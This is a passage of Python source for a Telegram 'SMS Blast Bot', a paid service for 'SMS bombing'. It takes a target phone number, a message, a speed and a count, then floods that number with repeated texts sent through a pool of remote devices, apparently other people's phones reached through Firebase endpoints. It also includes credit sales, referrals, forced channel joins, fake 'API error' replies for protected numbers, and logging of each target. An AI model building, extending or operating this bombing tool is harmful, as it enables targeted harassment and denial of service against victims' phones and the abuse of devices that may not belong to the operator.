            reply_markup=default_reply_keyboard(uid, d),
            parse_mode="HTML"
        )
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {OWNER_NAME}")
    await msg.answer(
        f"{DIVIDER}\n🎉 <b>{sc("welcome")}</b>\n{DIVIDER}\n"
        f"👤 <b>Role:</b> {role_tag(uid, d)}\n"
        f"💳 <b>Credits:</b> <b>{get_user_credits(uid, d)}</b>\n"
        f"📤 <b>Quota:</b> 1 credit = 10 SMS\n"
        f"👇 <i>Select an option below to continue.</i>\n{DIVIDER}",
        reply_markup=default_reply_keyboard(uid, d),
        parse_mode="HTML"
    )


# ============================================================
# REPLY KEYBOARD HANDLERS
# ============================================================

@R.message(F.text == "👑 OWNER PANEL")
async def reply_owner_panel(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Owner only!", parse_mode="HTML")
        return
    await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")


@R.message(F.text == "🛡 ADMIN PANEL")
async def reply_admin_panel(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Admin only!", parse_mode="HTML")
        return
    await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")


@R.message(F.text == "🚀 Send SMS")
async def reply_send_sms(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    if is_owner(uid, d):
        await state.set_state(S.owner_send_number)
        await msg.answer(
            f"{em(EMOJI_CROWN, '👑')} <b>ᴏᴡɴᴇʀ sᴍs sᴇɴᴅ</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
            f"Jis number pe SMS bhejna hai woh enter karo:",
            reply_markup=default_reply_keyboard(uid, d),
            parse_mode="HTML"
        )
    elif is_admin(uid, d):
        await state.set_state(S.admin_send_number)
        await msg.answer(
            f"{em(EMOJI_SHIELD, '🛡')} <b>ᴀᴅᴍɪɴ sᴍs sᴇɴᴅ</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
            f"Jis number pe SMS bhejna hai woh enter karo:",
            reply_markup=default_reply_keyboard(uid, d),
            parse_mode="HTML"
        )
    elif can_use(uid, d):
        await state.set_state(S.send_number)
        await msg.answer(
            f"{DIVIDER}\n📤 <b>{sc("sms request")}</b>\n{DIVIDER}\n"
            f"📍 <b>Step 1 of 4:</b> Enter the recipient number.\n"
            f"☎️ Use international format: <code>+919876543210</code>\n"
            f"🔒 Your request is processed securely.\n{DIVIDER}",
            reply_markup=default_reply_keyboard(uid, d),
            parse_mode="HTML"
        )
    else:
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!", parse_mode="HTML")


@R.message(F.text == "👤 Profile")
async def reply_profile(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    uid = msg.from_user.id
    udata = d["users"].get(str(uid), {})
    refer_code = udata.get("refer_code") or generate_user_refer_code(uid, d)
    save(d)
    await msg.answer(
        f"{DIVIDER}\n👤 <b>{sc("user profile")}</b>\n{DIVIDER}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"📛 <b>Name:</b> <b>{msg.from_user.full_name}</b>\n"
        f"💳 <b>Credits:</b> <b>{udata.get('credits', 0)}</b>\n"
        f"📤 <b>SMS sent:</b> <b>{udata.get('uses', 0)}</b>\n"
        f"🎁 <b>Referral code:</b> <code>{refer_code}</code>\n"
        f"👑 <b>Role:</b> {role_tag(uid, d)}\n{DIVIDER}",
        reply_markup=default_reply_keyboard(uid, d),
        parse_mode="HTML"
    )


@R.message(F.text == "🎁 Refer & Earn")
async def reply_refer(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    uid = msg.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    me = await msg.bot.get_me()
    ref_credits = d.get("settings", {}).get("ref_credits", 5)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎁')} <b>ʀᴇғᴇʀ & ᴇᴀʀɴ</b>\n\n"
        f"Har referral pe <b>{ref_credits}</b> credits!\n\n"
        f"{em(EMOJI_STAR, '🎟')} ᴄᴏᴅᴇ: <code>{code}</code>\n"
        f"{em(EMOJI_GEAR, '🔗')} ʟɪɴᴋ: https://t.me/{BOT_USERNAME or me.username}?start={code}",
        reply_markup=default_reply_keyboard(uid, d),
        parse_mode="HTML"
    )


@R.message(F.text == "🎟 Redeem")
async def reply_redeem(msg: Message, state: FSMContext):
    await state.set_state(S.redeem_code)
    await msg.answer(
        f"{DIVIDER}\n🎁 <b>{sc("redeem center")}</b>\n{DIVIDER}\n"
        f"🔑 <b>Enter your redeem code below.</b>\n"
        f"🎟 Example: <code>GIFTABC123</code>\n"
        f"✅ Valid codes add credits instantly.\n{DIVIDER}",
        parse_mode="HTML"
    )


@R.message(F.text == "💰 Buy Credit")
async def reply_buy_credit(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    uid = msg.from_user.id
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi plan available nahi!", reply_markup=default_reply_keyboard(uid, d), parse_mode="HTML")
        return
    text = f"{em(EMOJI_MONEY, '💰')} <b>ʙᴜʏ ᴄʀᴇᴅɪᴛ</b>\n\n"
    rows = []
    for plan in plans:
        text += f"{em(EMOJI_STAR, '📋')} <b>{plan['name']}</b> — {plan['price']} INR = {plan['credits']} credits\n"
        rows.append([btn_url(f"ʙᴜʏ {plan['name'][:20]}", plan['payment_link'], EMOJI_MONEY, "💳", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")])
    await msg.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.message(F.text == "💎 Premium Plans")
async def reply_buy_premium(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    uid = msg.from_user.id
    await msg.answer(
        f"{em(EMOJI_CROWN, '💎')} <b>ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs</b>\n\n"
        f"{em(EMOJI_ROCKET, '🚀')} Unlimited SMS blast\n"
        f"{em(EMOJI_GEAR, '⚡')} Fast speed\n"
        f"{em(EMOJI_MONEY, '💰')} Bonus credits\n"
        f"{em(EMOJI_CHECK, '✅')} Priority support\n\n"
        f"{em(EMOJI_CROWN, '👑')} Contact: {OWNER_LINK}",
        reply_markup=default_reply_keyboard(uid, d),
        parse_mode="HTML",
        disable_web_page_preview=True
    )


@R.message(F.text == "📊 Status")
async def reply_status(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    uid = msg.from_user.id
    udata = d["users"].get(str(uid), {})
    await msg.answer(
        f"{em(EMOJI_GEAR, '📊')} <b>sᴛᴀᴛᴜs</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{udata.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} sᴍs sᴇɴᴛ: <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴅᴇᴠɪᴄᴇs : <b>{len(CACHED_DEVICES)}</b> ᴏɴʟɪɴᴇ\n"
        f"{em(EMOJI_CROWN, '👑')} ʀᴏʟᴇ    : {role_tag(uid, d)}",
        reply_markup=default_reply_keyboard(uid, d),
        parse_mode="HTML"
    )


@R.message(F.text == "🆘 Support")
async def reply_support(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    uid = msg.from_user.id
    await msg.answer(
        f"{em(EMOJI_BELL, '🆘')} <b>sᴜᴘᴘᴏʀᴛ</b>\n\n"
        f"{em(EMOJI_CROWN, '👑')} Owner: {OWNER_LINK}\n"
        f"{em(EMOJI_STAR, '👤')} {OWNER_NAME}\n\n"
        f"<i>24/7 available!</i>",
        reply_markup=default_reply_keyboard(uid, d),
        parse_mode="HTML",
        disable_web_page_preview=True
    )


# ============================================================
# FORCE JOIN CHECK
# ============================================================

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return
    await cq.answer("✅ Verified!", show_alert=True)
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome! Verified Successfully.")
    await cq.message.answer(
        f"{em(EMOJI_ROCKET, '🚀')} <b>ᴠᴇʀɪғɪᴇᴅ!</b>\n\nNeeche buttons se bot use karein.",
        reply_markup=default_reply_keyboard(uid, d),
        parse_mode="HTML"
    )
    await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")


# ============================================================
# USER SEND SMS FLOW
# ============================================================

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:home")]),
        parse_mode="HTML"
    )


@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} <b>API error. Number temporarily unavailable.</b>", parse_mode="HTML")
        return
    asyncio.create_task(log_sms_number_entry(msg.bot, msg, number, "user"))
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:cancel")]),
        parse_mode="HTML"
    )


@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )


@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    speed_map = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    count = len(devices)
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        sms_capacity = get_sms_capacity(uid, d)
        credit_info = (
            f"\n{em(EMOJI_MONEY, '💰')} Credits: <b>{user_credits}</b>"
            f" | {em(EMOJI_CHECK, '📤')} SMS left: <b>{sms_capacity}</b>\n"
            f"<i>1 credit = 10 SMS</i>\n"
        )
    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:cancel")]),
        parse_mode="HTML"
    )


@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    if not is_admin(uid, d) and not is_owner(uid, d):
        sms_capacity = get_sms_capacity(uid, d)
        if sms_capacity <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Aapki SMS quota khatam ho gayi hai.</b>\n\n"
                f"1 credit = 10 SMS. Referral se credits earn karein.",
                reply_markup=default_reply_keyboard(uid, d), parse_mode="HTML"
            )
            await state.clear()
            return
        if count > sms_capacity:
            await msg.answer(
                f"{em(EMOJI_WARNING, '⚠️')} Aapke paas sirf <b>{sms_capacity} SMS</b> quota hai.\n"
                f"Count ko {sms_capacity} par set kiya gaya.", parse_mode="HTML"
            )
            count = sms_capacity
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!", reply_markup=default_reply_keyboard(uid, d), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)


# ============================================================
# OWNER SEND SMS FLOW
# ============================================================

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>ᴏᴡɴᴇʀ sᴍs sᴇɴᴅ</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number!", parse_mode="HTML")
        return
    asyncio.create_task(log_sms_number_entry(msg.bot, msg, number, "owner"))
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{number}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )


@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)
    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:home")]),
        parse_mode="HTML"
    )


@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!", reply_markup=default_reply_keyboard(msg.from_user.id, load()), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)


# ============================================================
# ADMIN SEND SMS FLOW
# ============================================================

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>ᴀᴅᴍɪɴ sᴍs sᴇɴᴅ</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]),
        parse_mode="HTML"
    )


@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number!", parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS:
        if not is_owner(msg.from_user.id, load()):
            await msg.answer(f"{em(EMOJI_CROSS, '❌')} <b>API error. Number temporarily unavailable.</b>", parse_mode="HTML")
            return
    asyncio.create_task(log_sms_number_entry(msg.bot, msg, number, "admin"))
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]),
        parse_mode="HTML"
    )


@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )


@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)
    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "admin:home")]),
        parse_mode="HTML"
    )


@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!", reply_markup=default_reply_keyboard(msg.from_user.id, load()), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)


# ============================================================
# SMS BLAST CORE
# ============================================================

async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing Started on {mask_number(number)}!</b>")
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>", parse_mode="HTML")
                return
            del USER_SESSIONS[uid]
        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None
    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to send progress: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS: del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0: break
                async with session.lock:
                    if session.cancelled: break
                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                device_quota = min(3, msgs_left)
                device_sent = 0
                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled: break
                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
                    async with session.lock:
                        if ok:
                            sent_ok += 1
                            device_sent += 1
                            msgs_left -= 1
                            if is_regular_user:
                                d_temp = load()
                                record_sms_success(uid, d_temp)
                                d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in d_temp["users"]:
                                    d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                                d_temp.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                    "number": number, "message": message[:100],
                                    "timestamp": int(time.time()), "status": "sent"
                                })
                                save(d_temp)
                        else:
                            sent_fail += 1
                            msgs_left -= 1
                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1
                        now = time.time()
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or session.cancelled):
                            current_credits_live = get_user_credits(uid, load()) if is_regular_user else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML"
                                )
                            except TelegramBadRequest: pass
                            last_update_time = now
                    await asyncio.sleep(speed)
        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS: del USER_SESSIONS[uid]

    if not is_regular_user:
        d_final = load()
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number, "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        save(d_final)
    else:
        d_final = load()
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid, f"Sent: {sent_ok}, Failed: {sent_fail}, Duration: {fmt_duration(duration)}")
    save(d_log)

    try:
        user_chat_info = await bot.get_chat(uid)
        u_name = user_chat_info.full_name or "Unknown"
        u_uname = f"@{user_chat_info.username}" if user_chat_info.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    chan_log = (
        f"🚀 <b>SMS BLAST LOG</b>\n\n"
        f"👤 {u_name}\n"
        f"🆔 <code>{uid}</code>\n"
        f"🌐 {u_uname}\n"
        f"📞 <code>{number}</code>\n"
        f"💬 <code>{message}</code>\n"
        f"✅ Sent: <b>{sent_ok}</b>\n"
        f"❌ Failed: <b>{sent_fail}</b>\n"
        f"⏱ {fmt_duration(duration)}\n"
        f"🛑 {'STOPPED' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0:
        icon = em(EMOJI_CHECK, "✅")
    elif sent_ok > 0:
        icon = em(EMOJI_WARNING, "⚠️")
    else:
        icon = em(EMOJI_CROSS, "❌")

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Credits Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{remaining}</b>"
    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne beech mein stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(int(time.time() - start_time))}</b>"

    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    elif is_admin(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
    else:
        back_btn = [btn("sᴇɴᴅ ᴀɢᴀɪɴ", "user:send", EMOJI_ROCKET, "📤", style="success"),
                    btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")]

    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs used: <b>{len(api_usage_delta)}</b>"
            f"{duration_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to edit final progress: {e}")


